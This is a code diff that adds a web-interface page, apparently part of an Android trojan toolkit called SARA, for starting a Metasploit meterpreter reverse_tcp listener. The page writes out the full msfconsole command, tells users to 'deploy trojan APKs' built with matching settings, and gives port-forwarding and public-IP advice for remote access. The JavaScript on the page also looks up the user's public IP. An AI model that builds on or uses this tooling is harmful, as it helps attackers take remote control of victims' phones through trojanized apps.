@@ -1,0 +1,252 @@
+{% extends "base.html" %}
+
+{% block title %}SARA - Trojan Listener{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-lg-8 mx-auto">
+        <div class="card bg-secondary">
+            <div class="card-header">
+                <h4 class="card-title mb-0">
+                    <i class="bi bi-ear text-success"></i> Trojan Listener
+                </h4>
+            </div>
+            <div class="card-body">
+                <p class="text-muted mb-4">
+                    Start a Metasploit listener to receive connections from trojan APKs.
+                    This will open a Metasploit console with the appropriate payload configured.
+                </p>
+
+                <form id="listenerForm">
+                    <div class="row g-3">
+                        <div class="col-md-6">
+                            <label for="hostAddress" class="form-label">Host Address (LHOST)</label>
+                            <input type="text" class="form-control" id="hostAddress" name="host" 
+                                   placeholder="127.0.0.1" value="127.0.0.1" required>
+                            <div class="form-text">IP address to listen on for incoming connections</div>
+                        </div>
+
+                        <div class="col-md-6">
+                            <label for="hostPort" class="form-label">Port (LPORT)</label>
+                            <input type="number" class="form-control" id="hostPort" name="port" 
+                                   placeholder="4444" value="4444" min="1" max="65535" required>
+                            <div class="form-text">Port number to listen on</div>
+                        </div>
+
+                        <div class="col-12">
+                            <div class="alert alert-info">
+                                <i class="bi bi-info-circle"></i>
+                                <strong>Requirements:</strong> Make sure Metasploit Framework is installed on your system.
+                                The listener will use the <code>android/meterpreter/reverse_tcp</code> payload.
+                            </div>
+                        </div>
+
+                        <div class="col-12">
+                            <button type="submit" class="btn btn-success" id="startBtn">
+                                <i class="bi bi-ear"></i> Start Listener
+                            </button>
+                            <button type="button" class="btn btn-danger" id="stopBtn" style="display: none;">
+                                <i class="bi bi-stop-circle"></i> Stop Listener
+                            </button>
+                            <a href="{{ url_for('index') }}" class="btn btn-secondary ms-2">
+                                <i class="bi bi-arrow-left"></i> Back to Home
+                            </a>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- Status Section -->
+                <div id="statusSection" class="mt-4" style="display: none;">
+                    <div class="card bg-dark">
+                        <div class="card-body">
+                            <h6 class="card-title">
+                                <i class="bi bi-activity"></i> Listener Status
+                            </h6>
+                            <div id="statusIndicator" class="d-flex align-items-center mb-3">
+                                <div class="spinner-border spinner-border-sm text-success me-2" role="status"></div>
+                                <span id="statusText" class="text-success">Listener is running...</span>
+                            </div>
+                            <div class="alert alert-success mb-0">
+                                <i class="bi bi-check-circle"></i>
+                                <strong>Listener Configuration:</strong><br>
+                                <code>use payload/android/meterpreter/reverse_tcp</code><br>
+                                <code>set lhost <span id="configHost">127.0.0.1</span></code><br>
+                                <code>set lport <span id="configPort">4444</span></code><br>
+                                <code>exploit -j</code>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Result Section -->
+                <div id="resultSection" class="mt-4" style="display: none;">
+                    <div id="resultCard" class="card">
+                        <div class="card-body">
+                            <h6 class="card-title">
+                                <i class="bi bi-info-circle"></i> Listener Result
+                            </h6>
+                            <p id="resultText" class="mb-0"></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Information Panel -->
+<div class="row mt-4">
+    <div class="col-lg-8 mx-auto">
+        <div class="card bg-dark border-success">
+            <div class="card-header border-success">
+                <h6 class="card-title mb-0">
+                    <i class="bi bi-lightbulb"></i> How to Use the Listener
+                </h6>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6 class="text-success">Setup Instructions:</h6>
+                        <ol>
+                            <li>Configure your host IP address</li>
+                            <li>Set the port to listen on</li>
+                            <li>Click "Start Listener"</li>
+                            <li>Deploy trojan APKs with matching settings</li>
+                            <li>Wait for incoming connections</li>
+                        </ol>
+                    </div>
+                    <div class="col-md-6">
+                        <h6 class="text-success">Network Configuration:</h6>
+                        <ul>
+                            <li><strong>Local testing:</strong> Use 127.0.0.1</li>
+                            <li><strong>LAN testing:</strong> Use your local IP</li>
+                            <li><strong>Remote testing:</strong> Use public IP</li>
+                            <li><strong>Port forwarding:</strong> May be required</li>
+                            <li><strong>Firewall:</strong> Allow incoming connections</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="alert alert-warning mt-3">
+                    <i class="bi bi-exclamation-triangle"></i>
+                    <strong>Important:</strong> The listener must be running before deploying trojan APKs.
+                    Make sure the host and port match the settings used when building the trojan.
+                </div>
+
+                <div class="alert alert-info mt-3">
+                    <i class="bi bi-terminal"></i>
+                    <strong>Manual Command:</strong> You can also start the listener manually using:<br>
+                    <code>msfconsole -q -x "use payload/android/meterpreter/reverse_tcp; set lhost YOUR_IP; set lport YOUR_PORT; exploit -j"</code>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_scripts %}
+<script>
+let listenerActive = false;
+
+document.getElementById('listenerForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const statusSection = document.getElementById('statusSection');
+    const resultSection = document.getElementById('resultSection');
+    
+    // Disable form and show status
+    startBtn.disabled = true;
+    startBtn.innerHTML = '<i class="bi bi-gear-fill"></i> Starting...';
+    statusSection.style.display = 'block';
+    resultSection.style.display = 'none';
+    
+    try {
+        const formData = {
+            host: document.getElementById('hostAddress').value,
+            port: document.getElementById('hostPort').value
+        };
+        
+        // Update config display
+        document.getElementById('configHost').textContent = formData.host;
+        document.getElementById('configPort').textContent = formData.port;
+        
+        const response = await fetch('/start_listener', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(formData)
+        });
+        
+        const result = await response.json();
+        
+        if (response.ok) {
+            listenerActive = true;
+            
+            // Update UI
+            startBtn.style.display = 'none';
+            stopBtn.style.display = 'inline-block';
+            
+            // Show success
+            resultSection.style.display = 'block';
+            document.getElementById('resultCard').className = 'card bg-success';
+            document.getElementById('resultText').textContent = result.message;
+            
+        } else {
+            throw new Error(result.error || 'Failed to start listener');
+        }
+        
+    } catch (error) {
+        // Show error
+        statusSection.style.display = 'none';
+        resultSection.style.display = 'block';
+        document.getElementById('resultCard').className = 'card bg-danger';
+        document.getElementById('resultText').textContent = `Error: ${error.message}`;
+        
+        // Reset button
+        startBtn.disabled = false;
+        startBtn.innerHTML = '<i class="bi bi-ear"></i> Start Listener';
+    }
+});
+
+document.getElementById('stopBtn').addEventListener('click', function() {
+    if (listenerActive) {
+        listenerActive = false;
+        
+        // Reset UI
+        document.getElementById('startBtn').style.display = 'inline-block';
+        document.getElementById('startBtn').disabled = false;
+        document.getElementById('startBtn').innerHTML = '<i class="bi bi-ear"></i> Start Listener';
+        document.getElementById('stopBtn').style.display = 'none';
+        document.getElementById('statusSection').style.display = 'none';
+        
+        // Show stopped message
+        document.getElementById('resultSection').style.display = 'block';
+        document.getElementById('resultCard').className = 'card bg-warning';
+        document.getElementById('resultText').textContent = 'Listener stopped. Note: Metasploit console may still be running in the background.';
+    }
+});
+
+// Get current IP address for convenience
+async function getCurrentIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        return null;
+    }
+}
+
+// Auto-fill public IP option
+window.addEventListener('load', async function() {
+    const publicIP = await getCurrentIP();
+    if (publicIP) {
+        const hostInput = document.getElementById('hostAddress');
+        hostInput.placeholder = `127.0.0.1 (or ${publicIP} for remote access)`;
+    }
+});
+</script>
+{% endblock %}
